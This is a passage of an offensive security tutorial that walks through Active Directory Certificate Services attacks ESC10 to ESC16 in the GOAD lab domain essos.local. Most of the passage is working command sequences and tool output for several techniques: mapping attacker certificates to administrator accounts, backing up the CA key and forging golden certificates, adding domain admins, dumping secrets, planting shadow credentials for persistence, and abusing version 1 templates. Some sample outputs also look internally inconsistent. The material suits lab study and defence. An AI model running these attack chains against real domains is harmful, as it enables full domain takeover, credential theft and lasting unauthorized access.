    Write-Host "Template '$($template.Name)' does NOT have the NO_SECURITY_EXTENSION flag set."
}

# Output shows template has NO_SECURITY_EXTENSION flag set - perfect for persistence!
</code></pre>
<h2>ESC10: Weak Certificate Mappings</h2>
<p>ESC10 exploits weak certificate-to-account mapping configurations and certificate mapping vulnerabilities.</p>
<h3>Attack Vectors</h3>
<p><strong>ESC10A - Write Access on altSecurityIdentities:</strong></p>
<ul>
<li>Attackers with write permissions on user objects can modify <code>altSecurityIdentities</code></li>
<li>This attribute maps certificates to user accounts</li>
<li>Malicious mapping allows certificate-based authentication as other users</li>
</ul>
<p><strong>ESC10B - Weak Certificate Mapping Methods:</strong></p>
<ul>
<li>Exploits weak <code>CertificateMappingMethods</code> registry settings</li>
<li>Allows certificate authentication with partial subject matching</li>
</ul>
<h3>Exploitation Example</h3>
<p>Let's try ESC10A in GOAD:</p>
<pre class="language-bash"><code class="language-bash"># ESC10A - Modify altSecurityIdentities attribute
# First, create a computer account and request machine certificate
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123!' essos/missandei:fr3edom@meereen.essos.local

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account EVIL$ with password Password123!.

# Request machine certificate for our new computer
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:Machine /machine

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\EVIL$
[*] Template                : Machine
[*] Subject                 : CN=EVIL, CN=Computers, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 18

# Extract certificate details (issuer, serial number)
certutil -dump evil.pem

Certificate:
    Serial Number: 6100000028f9b2d3c5a1b4e87a00000000000028
    Issuer: CN=ESSOS-CA, DC=essos, DC=local
    Subject: CN=EVIL, CN=Computers, DC=essos, DC=local

# Modify target user's altSecurityIdentities to map to our certificate
$dn = "CN=administrator,CN=Users,DC=essos,DC=local"
$mapping = "X509:&#x3C;I>CN=ESSOS-CA,DC=essos,DC=local&#x3C;S>6100000028f9b2d3c5a1b4e87a00000000000028"
Set-ADObject -Identity $dn -Replace @{'altSecurityIdentities' = $mapping}

# Authenticate as administrator using our EVIL$ machine certificate

Rubeus.exe asktgt /user:administrator /certificate:evil.pfx /password:Password123!

[*] Action: Ask TGT
[*] Using certificate mapping via altSecurityIdentities
[*] Using PKINIT with etype rc4_hmac and subject: CN=EVIL, CN=Computers, DC=essos, DC=local
[+] TGT request successful!

  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025 6:45:12 PM
  EndTime                  : 1/4/2025 4:45:12 AM
  RenewTill                : 1/10/2025 6:45:12 PM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
</code></pre>
<p>Perfect! We've successfully used ESC10A to authenticate as administrator using a machine certificate mapped via <code>altSecurityIdentities</code>.</p>
<h2>ESC11: IF_ENFORCEENCRYPTICERTREQUEST</h2>
<p>ESC11 targets CAs configured with IF_ENFORCEENCRYPTICERTREQUEST flag, which can be bypassed under certain conditions.</p>
<h3>Attack Vector</h3>
<p>ESC11 exploits RPC call tampering when certificate requests are transmitted unencrypted to the Certificate Authority.</p>
<p><strong>Important:</strong> The "unencrypted request" only succeeds when the CA has <code>IF_ENFORCEENCRYPTICERTREQUEST</code> cleared. If this flag is set (the secure default on modern Windows versions), the RPC interface forces packet privacy and NTLM relay fails.</p>
<h3>Prerequisites</h3>
<p>Let's check the GOAD CA configuration. Check if CA has IF_ENFORCEENCRYPTICERTREQUEST flag cleared:</p>
<pre class="language-bash"><code class="language-bash">certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\InterfaceFlags

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\ESSOS-CA\InterfaceFlags REG_DWORD = 0x0 (0)

</code></pre>
<p>H0x0 = vulnerable (no encryption required), 0x200 = hardened (encryption required). IF_ENFORCEENCRYPTICERTREQUEST is NOT set (flag would be 0x200) - this makes the CA vulnerable to ESC11.</p>
<ol>
<li><strong>CA has IF_ENFORCEENCRYPTICERTREQUEST flag cleared</strong> ✓</li>
<li><strong>Unencrypted certificate request</strong> ✓</li>
</ol>
<h3>Bypass Technique</h3>
<pre class="language-csharp"><code class="language-csharp">// Create unencrypted certificate request for GOAD environment
public class ESC11Exploit
{
    public string CreateUnencryptedRequest(string subject, string altname = "administrator@essos.local")
    {
        var request = new CX509CertificateRequestPkcs10();
        var privateKey = new CX509PrivateKey();
        
        // Configure for unencrypted submission to GOAD CA
        privateKey.ProviderName = "Microsoft Software Key Storage Provider";
        privateKey.Create();
        
        request.InitializeFromPrivateKey(
            X509CertificateEnrollmentContext.ContextUser,
            privateKey,
            "");
            
        request.Subject = new CX500DistinguishedName(subject);
        
        // Add SAN for GOAD domain
        var sanExtension = new CX509ExtensionAlternativeNames();
        var altNames = new CAlternativeNames();
        var altNameObj = new CAlternativeName();
        
        altNameObj.InitializeFromString(
            AlternativeNameType.XCN_CERT_ALT_NAME_RFC822_NAME,
            altname);
        altNames.Add(altNameObj);
        
        sanExtension.InitializeEncode(altNames);
        request.X509Extensions.Add(sanExtension);
        
        // Submit without encryption to vulnerable GOAD CA
        return request.Encode();
    }
}
</code></pre>
<p>The C# code above demonstrates how a certificate request (CSR) payload can be constructed. For the actual ESC11 attack, an attacker would typically use a tool like an adapted <code>ntlmrelayx.py</code> or custom tooling to relay incoming NTLM authentication (e.g., from a coerced machine account) to the ADCS server's <code>ICertRequestD</code> DCOM interface over unencrypted RPC. Once the NTLM relay is established, the attacker's tool submits the CSR (like the one generated above, often for a privileged account or a machine account with a useful SAN) on behalf of the relayed account. If successful, the CA issues the certificate for the target specified in the CSR, effectively escalating privileges.</p>
<h2>ESC12: Shell Access to CA Server</h2>
<p>ESC12 is the holy grail - when you get shell access to the actual Certificate Authority server. At this point, you basically own the entire PKI infrastructure.</p>
<p>ESC12 also covers YubiHSM vulnerabilities discovered by Hans-Joachim Knobloch, but this specific attack vector is not implemented in the standard GOAD environment.</p>
<p>In GOAD, the CA server is <code>braavos.essos.local</code>. Let's say we've compromised it:</p>
<h3>Golden Certificate Creation (CA Private Key Compromise)</h3>
<p>When you have CA administrator access (like <code>khal.drogo</code> in GOAD), you can extract the CA private key and forge golden certificates:</p>
<pre class="language-bash"><code class="language-bash"># Extract CA certificate and private key with certipy
certipy ca -backup -u khal.drogo@essos.local -p horse -dc-ip 192.168.56.12 -ca 'ESSOS-CA' -target 192.168.56.23 -debug

[*] Action: Backup CA
[*] Backing up CA 'ESSOS-CA'
[*] Saved certificate and private key to 'ESSOS-CA.pfx'

# Forge a certificate as domain admin
certipy forge -ca-pfx 'ESSOS-CA.pfx' -upn administrator@essos.local

[*] Action: Forge Certificate
[*] Forged certificate saved to 'administrator_forged.pfx'

# Authenticate with schannel
certipy auth -pfx administrator_forged.pfx -ldap-shell

[*] Action: Authenticate
[*] LDAP shell available

# add_user newdomainadmin
# add_user_to_group newdomainadmin "Domain admins"

# Alternative: Authenticate with PKINIT
# First request a valid certificate as template
certipy req -u 'khal.drogo@essos.local' -p horse -ca 'ESSOS-CA' -template User -target 192.168.56.23

# Reforge with template to fix CRL issues
certipy forge -ca-pfx 'ESSOS-CA.pfx' -upn administrator@essos.local -template khal.drogo.pfx


Rubeus.exe asktgt /user:administrator /certificate:administrator_forged.pfx /password:mimikatz

# Or use gettgtpkinit.py
gettgtpkinit.py -cert-pfx administrator_forged.pfx -dc-ip 192.168.56.12 "essos.local/administrator" admin_tgt.cccache

export KRB5CCNAME=/workspace/admin_tgt.cccache
secretsdump.py -k meereen.essos.local -dc-ip 192.168.56.12
</code></pre>
<h3>Post-Exploitation Techniques</h3>
<h2>ESC13: Issuance Policy OID Group Links</h2>
<p>ESC13 exploits the ADCS feature where certificate templates can have issuance policies with OID group links to Active Directory groups. This allows principals to gain access as members of linked groups by requesting certificates with the appropriate issuance policies.</p>
<h3>Technical Details</h3>
<p>This attack abuses Microsoft's Authentication Mechanism Assurance (AMA) feature where:</p>
<ul>
<li>Certificate templates contain issuance policies (stored in <code>msPKI-Certificate-Policy</code> attribute)</li>
<li>Issuance policies can be linked to AD groups via <code>msDS-OIDToGroupLink</code> attribute</li>
<li>When authenticating with such certificates, users gain group membership permissions</li>
</ul>
<h3>Requirements</h3>
<ol>
<li><strong>Principal has enrollment rights</strong> on a certificate template</li>
<li><strong>Certificate template has an issuance policy extension</strong></li>
<li><strong>Issuance policies can be linked to AD groups via <code>msDS-OIDToGroupLink</code> attribute</strong></li>
<li><strong>No issuance requirements</strong> the principal cannot meet</li>
<li><strong>EKUs enable client authentication</strong></li>
</ol>
<h3>Exploitation Process</h3>
<p>Let's check for ESC13 conditions in GOAD:</p>
<pre class="language-bash"><code class="language-bash"># Find templates with issuance policies linked to groups in essos.local
Import-Module ActiveDirectory

$templates = Get-ADObject -Filter 'objectClass -eq "pKICertificateTemplate"' -Properties msPKI-Certificate-Policy -SearchBase "CN=Configuration,DC=essos,DC=local"

foreach ($template in $templates) {
    if ($template.'msPKI-Certificate-Policy') {
        $policies = $template.'msPKI-Certificate-Policy'
        foreach ($policy in $policies) {
            $oid = Get-ADObject -Filter * -SearchBase "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties msDS-OIDToGroupLink | Where-Object {$_.msDS-OIDToGroupLink -and $policy -eq $_.'msPKI-Cert-Template-OID'}
            if ($oid.'msDS-OIDToGroupLink') {
                Write-Host "Template $($template.Name) linked to group: $($oid.'msDS-OIDToGroupLink')"
            }
        }
    }
}

Template ESC13Template linked to group: CN=Enterprise Admins,CN=Users,DC=essos,DC=local

# Perfect! ESC13Template is linked to Enterprise Admins

# Request certificate from vulnerable template
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC13Template

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : ESC13Template
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 17

# Authenticate with certificate to gain Enterprise Admin group membership

Rubeus.exe asktgt /user:missandei /certificate:esc13.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful!

# The TGT now contains Enterprise Admins group membership!
# Verify with whoami /groups after using the ticket

Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...

[*] Action: Import Ticket
[+] Ticket successfully imported!

# Now we have Enterprise Admin privileges in the forest
net group "Enterprise Admins" /domain

Group name     Enterprise Admins
Comment        Designated administrators of the enterprise

Members

-------------------------------------------------------------------------------
Administrator  missandei
The command completed successfully.
</code></pre>
<h3>Group Requirements</h3>
<p>The linked group must be:</p>
<ul>
<li><strong>Empty</strong> (no actual members)</li>
<li><strong>Universal scope</strong> (forest-wide)</li>
</ul>
<p>Common universal groups include Enterprise Admins, Schema Admins, Enterprise Key Admins.</p>
<h2>ESC14: Shadow Credentials and Advanced Certificate Mapping</h2>
<p>ESC14 represents advanced certificate mapping abuse techniques that go beyond basic <code>altSecurityIdentities</code> manipulation covered in ESC10. This technique focuses on shadow credentials and sophisticated certificate-to-account mapping scenarios.</p>
<h3>Technical Background</h3>
<p>ESC14 exploits advanced certificate mapping mechanisms including:</p>
<ul>
<li><strong>Shadow Credentials</strong>: Abusing <code>msDS-KeyCredentialLink</code> attribute for certificate-based authentication</li>
<li><strong>Advanced Certificate Mapping</strong>: Sophisticated manipulation of certificate-to-account relationships</li>
<li><strong>Cross-Domain Certificate Abuse</strong>: Exploiting certificate mappings across domain boundaries</li>
</ul>
<h3>Attack Scenarios</h3>
<p><strong>ESC14A - Shadow Credentials Abuse:</strong></p>
<ul>
<li>Attackers with write permissions on user objects can add shadow credentials</li>
<li>Allows certificate-based authentication without traditional certificate enrollment</li>
<li>Bypasses many traditional ADCS controls</li>
</ul>
<p><strong>ESC14B - Advanced Certificate Mapping:</strong></p>
<ul>
<li>Sophisticated certificate mapping scenarios beyond basic ESC10 techniques</li>
<li>Cross-domain certificate abuse in multi-domain environments like GOAD</li>
<li>Certificate mapping persistence mechanisms</li>
</ul>
<h3>Exploitation Process</h3>
<p>Let's demonstrate ESC14 techniques in our GOAD environment. ESC14A - altSecurityIdentities Manipulation in GOAD:</p>
<pre class="language-bash"><code class="language-bash"># First, create a computer account for certificate mapping
addcomputer.py -method ldaps -computer-name 'esc14computer$' -computer-pass 'Il0veCertific@te' -dc-ip 192.168.56.12 essos/missandei:fr3edom@192.168.56.12

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account esc14computer$ with password Il0veCertific@te.

# Request machine certificate for our created computer
certipy req -target braavos.essos.local -u 'esc14computer$@essos.local' -p 'Il0veCertific@te' -dc-ip 192.168.56.12 -template Machine -ca ESSOS-CA -debug

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\esc14computer$
[*] Template                : Machine
[*] Subject                 : CN=esc14computer, CN=Computers, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 25

# Extract certificate details for mapping
certipy cert -pfx esc14computer.pfx -nokey -out "esc14computer.crt"
openssl x509 -in esc14computer.crt -noout -text

Certificate:
    Data:
        Serial Number: 43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11
        Issuer: CN=ESSOS-CA, DC=essos, DC=local
        Subject: CN=esc14computer, CN=Computers, DC=essos, DC=local

# Check current altSecurityIdentities
ldeep ldap -u missandei -d essos.local -p fr3edom -s ldap://192.168.56.12 search '(samaccountname=khal.drogo)' altSecurityIdentities

[{
  "altSecurityIdentities": [],
  "dn": "CN=khal.drogo,CN=Users,DC=essos,DC=local"
}]
</code></pre>
<h3>X509 Certificate Mapping Format</h3>
<p>The reference article provides a Python script to format the X509 mapping correctly:</p>
<pre class="language-python"><code class="language-python">import argparse

def get_x509_issuer_serial_number_format(serial_number: str, issuer_distinguished_name: str) -> str:
    """
    Formats the X509IssuerSerialNumber for the altSecurityIdentities attribute.
    :param serial_number: Serial number in the format "43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11"
    :param issuer_distinguished_name: Issuer distinguished name, e.g., "CN=ESSOS-CA,DC=essos,DC=local"
    :return: Formatted X509IssuerSerialNumber
    """
    serial_bytes = serial_number.split(":")
    reversed_serial_number = "".join(reversed(serial_bytes))
    issuer_components = issuer_distinguished_name.split(",")
    reversed_issuer_components = ",".join(reversed(issuer_components))
    return f"X509:&#x3C;I>{reversed_issuer_components}&#x3C;SR>{reversed_serial_number}"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Format X509 Issuer Serial Number")
    parser.add_argument("-serial", required=True, help="Serial number in format 43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11")
    parser.add_argument("-issuer", required=True, help="Issuer Distinguished Name e.g., CN=ESSOS-CA,DC=essos,DC=local")

    args = parser.parse_args()
    formatted_value = get_x509_issuer_serial_number_format(args.serial, args.issuer)
    print(formatted_value)

# Usage:
python3 x509_issuer_serial_number_format.py -serial "43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11" -issuer "CN=ESSOS-CA,DC=essos,DC=local"

X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>110000000000a68816e592b078921100000043
</code></pre>
<h3>LDAP Attribute Modification</h3>
<p>Script to modify altSecurityIdentities attribute:</p>
<pre class="language-python"><code class="language-python">import ldap3

dn = "CN=khal.drogo,CN=Users,DC=essos,DC=local"
user = "essos.local\\missandei"
password = "fr3edom"
server = ldap3.Server('meereen.essos.local')
ldap_con = ldap3.Connection(server=server, user=user, password=password, authentication=ldap3.NTLM)
ldap_con.bind()

# Set the certificate mapping
ldap_con.modify(dn, {
    'altSecurityIdentities': [(ldap3.MODIFY_REPLACE, 'X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>110000000000a68816e592b078921100000043')]
})

print(ldap_con.result)
ldap_con.unbind()

# Verify the mapping was set
ldeep ldap -u missandei -d essos.local -p fr3edom -s ldap://192.168.56.12 search '(samaccountname=khal.drogo)' altSecurityIdentities

[{
  "altSecurityIdentities": [
    "X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>110000000000a68816e592b078921100000043"
  ],
  "dn": "CN=khal.drogo,CN=Users,DC=essos,DC=local"
}]

# Authenticate as khal.drogo using our machine certificate!
gettgtpkinit.py -cert-pfx esc14computer.pfx -dc-ip 192.168.56.12 "essos.local/khal.drogo" khal_tgt.ccache

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting TGT for khal.drogo@essos.local using Kerberos PKINIT
[+] TGT request successful!
[*] Saved TGT to khal_tgt.ccache
</code></pre>
<h3>Advanced Persistence with ESC14</h3>
<pre class="language-bash"><code class="language-bash"># ESC14 Persistence - Shadow Credentials for Domain Admin
# Add shadow credentials to Domain Admin account (if we have permissions)
python3 pywhisker.py -d essos.local -u khal.drogo -p horse --target administrator --action add --dc-ip 192.168.56.12

[*] Target user found: CN=Administrator,CN=Users,DC=essos,DC=local
[*] Adding KeyCredential to the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved certificate to administrator_shadow.crt
[*] Saved private key to administrator_shadow.pem

# This provides persistent access to Domain Admin even after password changes
gettgtpkinit.py -cert-pem administrator_shadow.pem -key-pem administrator_shadow.pem essos.local/administrator admin_shadow.ccache

# ESC14 Advanced Mapping - Multiple Certificate Mappings
# Add multiple certificate mappings for redundancy
$certificates = @(
    "X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000043",
    "X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000044",
    "X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000045"
)

foreach ($cert in $certificates) {
    $currentMappings = (Get-ADUser administrator -Properties altSecurityIdentities).altSecurityIdentities
    $newMappings = $currentMappings + $cert
    Set-ADUser administrator -Replace @{'altSecurityIdentities' = $newMappings}
}

# Verify multiple mappings
Get-ADUser administrator -Properties altSecurityIdentities | Select-Object -ExpandProperty altSecurityIdentities

X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000043
X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000044
X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000045
</code></pre>
<h3>Key Differences from ESC10</h3>
<p>ESC14 differs from ESC10 in several important ways:</p>
<ul>
<li><strong>Shadow Credentials</strong>: Uses <code>msDS-KeyCredentialLink</code> instead of traditional certificate enrollment</li>
<li><strong>Cross-Domain Abuse</strong>: Sophisticated mapping across domain boundaries</li>
<li><strong>Advanced Persistence</strong>: Multiple mapping techniques for redundancy</li>
<li><strong>Bypasses Traditional Controls</strong>: Works around many ADCS security measures</li>
</ul>
<h3>Remediation</h3>
<ol>
<li><strong>Monitor Key Attributes</strong>: Watch for changes to <code>msDS-KeyCredentialLink</code> and <code>altSecurityIdentities</code></li>
<li><strong>Restrict Permissions</strong>: Limit write access to user objects, especially high-privilege accounts</li>
<li><strong>Cross-Domain Hardening</strong>: Implement strict certificate mapping validation across domain boundaries</li>
<li><strong>Regular Audits</strong>: Periodically audit certificate mappings and shadow credentials</li>
</ol>
<h2>ESC15: Version 1 Template Application Policies (CVE-2024-49019)</h2>
<p>ESC15, also known as "EKUwu", exploits a vulnerability in version 1 certificate templates where attackers can specify arbitrary Application Policies in certificate requests, overriding the template's intended Extended Key Usage. This vulnerability was discovered by Justin Bollinger from TrustedSec and reported to Microsoft in October 2024.</p>
<h3>Technical Background</h3>
<ul>
<li><strong>Application Policies</strong> (OID 1.3.6.1.4.1.311) are Microsoft's proprietary extension</li>
<li>When both Application Policy and EKU exist, <strong>Application Policy takes precedence</strong></li>
<li>Version 1 templates don't validate Application Policy fields in requests</li>
<li>Attackers can add dangerous policies like Certificate Request Agent or Client Authentication</li>
</ul>
<h3>Vulnerability Conditions</h3>
<ol>
<li><strong>Version 1 certificate template</strong> (schema version = 1)</li>
<li><strong>Template allows "Supply in the Request"</strong> subject specification</li>
<li><strong>Principal has enrollment rights</strong> on the template</li>
</ol>
<h3>Exploitation Process</h3>
<p><strong>Important:</strong> The reference GOAD article shows ESC15 exploitation as a <strong>two-step process</strong> using Certificate Request Agent capabilities:</p>
<pre class="language-bash"><code class="language-bash"># Step 1: Request certificate with Certificate Request Agent application policy
certipy req -u missandei@essos.local -p fr3edom --application-policies "1.3.6.1.4.1.311.20.2.1" -ca ESSOS-CA -template WebServer -dc-ip 192.168.56.12 -target braavos.essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : WebServer (vulnerable version 1)
[*] Application Policy      : Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 19

# Step 2: Use Certificate Request Agent certificate to request admin certificate on-behalf-of
certipy req -u missandei@essos.local -on-behalf-of essos\\administrator -template User -ca ESSOS-CA -pfx missandei.pfx -dc-ip 192.168.56.12 -target braavos.essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : User
[*] On behalf of            : essos\administrator
[*] Using Certificate Request Agent certificate

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 20

# Step 3: Authenticate as administrator

Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local
[+] TGT request successful!
</code></pre>
<p><strong>Alternative Method (Direct Application Policy Override):</strong></p>
<p>ESC15 Exploitation Example - Method 1: Using certreq with custom INF file:</p>
<pre class="language-bash"><code class="language-bash">$infContent = @"
[NewRequest]
Subject = "CN=missandei,CN=Users,DC=essos,DC=local"
KeyLength = 2048
KeyAlgorithm = RSA
MachineKeySet = FALSE
RequestType = PKCS10
CertificateTemplate = WebServer

[Extensions]
1.3.6.1.4.1.311.21.10 = "{text}1.3.6.1.5.5.7.3.2"
2.5.29.17 = "{text}upn=administrator@essos.local"
"@

$infContent | Out-File -FilePath "esc15.inf"
</code></pre>
<pre class="language-bash"><code class="language-bash">certreq -new -f esc15.inf esc15.req
certreq -submit -config "braavos.essos.local\ESSOS-CA" esc15.req

Certificate Request Processor: The request is taken under submission Request ID = 19
</code></pre>
<p>Method 2: Using Certipy v5.0+ (if available with ESC15 support)</p>
<p><code>certipy req -u missandei@essos.local -p fr3edom -ca ESSOS-CA -template WebServer -dc-ip 192.168.56.12 -target braavos.essos.local -upn administrator@essos.local -key-size 2048</code></p>
<p>The attack works because version 1 templates don't validate Application Policy extensions and Application Policies override Extended Key Usage when both are present</p>
<p>Retrieve the issued certificate:</p>
<p><code>certreq -retrieve 19 esc15.cer</code>
<code>certreq -accept esc15.cer</code></p>
<p>The issued certificate will contain both:</p>
<ul>
<li>Original EKU: Server Authentication</li>
<li>Application Policy: Client Authentication (takes precedence)</li>
</ul>
<p>Verify certificate content</p>
<pre class="language-bash"><code class="language-bash">certutil -dump esc15.cer | findstr -i "application\|enhanced"

Application Policies:
    [1]Application Policy:
         Policy Identifier=Client Authentication
         Policy Qualifier Info:
              Policy Qualifier Id=CPS
              Qualifier:
                   http://braavos.essos.local/CertEnroll/ESSOS-CA_CPS.html

Enhanced Key Usage:
    Server Authentication (1.3.6.1.5.5.7.3.1)

# Authenticate using certificate - Application Policy overrides EKU
Rubeus.exe asktgt /user:administrator /certificate:esc15.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[*] Certificate Application Policy overrides EKU: Client Authentication
[+] TGT request successful!
</code></pre>
<p>ESC15 can also be weaponized for Certificate Request Agent attacks. Create INF file for Certificate Request Agent capability:</p>
<pre class="language-bash"><code class="language-bash">$craInfContent = @"
[NewRequest]
Subject = "CN=missandei,CN=Users,DC=essos,DC=local"
KeyLength = 2048
KeyAlgorithm = RSA
MachineKeySet = FALSE
RequestType = PKCS10
CertificateTemplate = WebServer

[Extensions]
1.3.6.1.4.1.311.21.10 = "{text}1.3.6.1.4.1.311.20.2.1"
"@

$craInfContent | Out-File -FilePath "esc15-cra.inf"
</code></pre>
<p><code>certreq -new -f esc15-cra.inf esc15-cra.req</code>
<code>certreq -submit -config "braavos.essos.local\ESSOS-CA" esc15-cra.req</code></p>
<p>Now we can request certificates on behalf of other users!</p>
<h3>Vulnerable Default Templates</h3>
<p>All version 1 templates are potentially vulnerable when enrollment rights are granted in GOAD:</p>
<ul>
<li><strong>WebServer</strong> (most commonly exploited) ✓ Found in GOAD</li>
<li>ExchangeUser</li>
<li>CEPEncryption</li>
<li>OfflineRouter</li>
<li>IPSECIntermediateOffline</li>
<li>SubCA</li>
<li>CA</li>
<li>EnrollmentAgentOffline</li>
</ul>
<h3>Remediation</h3>
<p><strong>Microsoft has patched this vulnerability as of November 12, 2024 (CVE-2024-49019).</strong> Additional protective measures include:</p>
<h2>ESC16: CA-Wide Security Extension Removal</h2>
<p><strong>Status: ACTIVE THREAT</strong></p>
<p>ESC16 represents a critical misconfiguration where the Certificate Authority is configured to omit the <code>szOID_NTDS_CA_SECURITY_EXT</code> extension (OID: <code>1.3.6.1.4.1.311.25.2</code>) on every certificate it issues.</p>
<h3>Technical Details</h3>
<p>ESC16 arises when the CA is configured to <strong>omit</strong> the <code>szOID_NTDS_CA_SECURITY_EXT</code> extension on every certificate it issues. Without this extension, a certificate no longer includes the account's SID, breaking the strong certificate-to-account binding enforced by Windows Server 2022 and later (KB5014754).</p>
<p><strong>Key Difference from ESC9:</strong></p>
<ul>
<li><strong>ESC9</strong>: Individual templates lack the security extension requirement</li>
<li><strong>ESC16</strong>: The CA itself is configured to never include the security extension, affecting ALL certificates regardless of template</li>
</ul>
<h3>Vulnerability Conditions</h3>
<ol>
<li><strong>CA EditFlags modified</strong> to remove <code>require_sidisupport</code></li>
<li><strong>Global security extension removal</strong> affecting all issued certificates</li>
<li><strong>Any template with client authentication</strong> EKU becomes exploitable</li>
</ol>
<h3>Detection</h3>
<p>Let's check for ESC16 in our GOAD environment. Certipy v5+ detects ESC16 during enumeration:</p>
<pre class="language-bash"><code class="language-bash">certipy find -u missandei@essos.local -p fr3edom -dc-ip 192.168.56.12 -target braavos.essos.local

Certipy v5.0.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Finding certificate authority configurations
[*] Found 1 certificate authority configuration

[!] ESC16: CA 'ESSOS-CA' is configured to omit szOID_NTDS_CA_SECURITY_EXT on all certificates!
    This makes ALL certificates vulnerable to impersonation attacks.
    
    CA Name                         : ESSOS-CA
    DNS Hostname                    : braavos.essos.local
    Certificate Subject             : CN=ESSOS-CA, DC=essos, DC=local
    Certificate Serial Number       : 43000000119278B092E51688A600000000000011
    Certificate Validity Start      : 2023-01-15 14:14:32+00:00
    Certificate Validity End        : 2033-01-15 14:24:32+00:00
    Security Extension Enforcement  : DISABLED (ESC16 VULNERABLE!)

# Check CA configuration manually
certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\ESSOS-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags REG_DWORD = 0x80000 (524288)
</code></pre>
<p>Look for missing EDITF_ENABLEDEFAULTSMIME (0x10000) or similar flags that enforce security extension. If EditFlags shows the CA has been configured to skip security extensions, ESC16 is present.</p>
<h3>Exploitation</h3>
<p>With ESC16, ANY certificate request becomes dangerous:</p>
<pre class="language-bash"><code class="language-bash"># ESC16 makes even restricted templates exploitable
# Request certificate from a normally "safe" template
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : User
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 20

# Due to ESC16, the certificate lacks the security extension
# even though the template might normally include it

# Convert and use for authentication
openssl pkcs12 -in cert.pem -export -out admin_esc16.pfx -password pass:mimikatz

# Authentication succeeds despite missing security extension

Rubeus.exe asktgt /user:administrator /certificate:admin_esc16.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful! - ESC16 allows impersonation without SID binding

  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025 7:45:30 PM
  EndTime                  : 1/4/2025 5:45:30 AM
  RenewTill                : 1/10/2025 7:45:30 PM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
</code></pre>
